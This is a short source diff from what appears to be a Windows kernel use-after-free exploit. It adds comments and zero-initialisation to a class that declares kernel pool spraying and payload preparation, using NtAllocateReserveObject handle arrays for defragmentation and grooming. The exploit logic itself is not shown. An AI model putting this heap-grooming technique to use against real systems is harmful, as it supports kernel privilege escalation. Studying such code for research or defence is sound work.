@@ -80,12 +80,16 @@ namespace payload_use_after_free {
 			}
 			return b_res;
 		}
-
+		
+		/* Windows Kernel Pool Spraying */
 		bool prepare_memory();
 
+		/* Prepare payload */
 		bool prepare_payload();
 
+		/* Free allocated memory */
 		void clear();
+
 		static const DWORD poolDefragSz = 0x1000;
 		static const DWORD poolGroomSz = 0x500;
 	private:
@@ -93,10 +97,9 @@ namespace payload_use_after_free {
 		HMODULE _hModuleNtDll; // handle from NtDll.dll 
 		NtAllocate_type _NtAllocateFunc; // address of NtAllocateReserveObject() func
 
-		HANDLE hReserveObjectsDefrag[poolDefragSz];
+		HANDLE hReserveObjectsDefrag[poolDefragSz] = {0};
 		
-		
-		HANDLE hReserveObjectsPoolGroom[poolGroomSz];
+		HANDLE hReserveObjectsPoolGroom[poolGroomSz] = {0};
 	};
 }
 
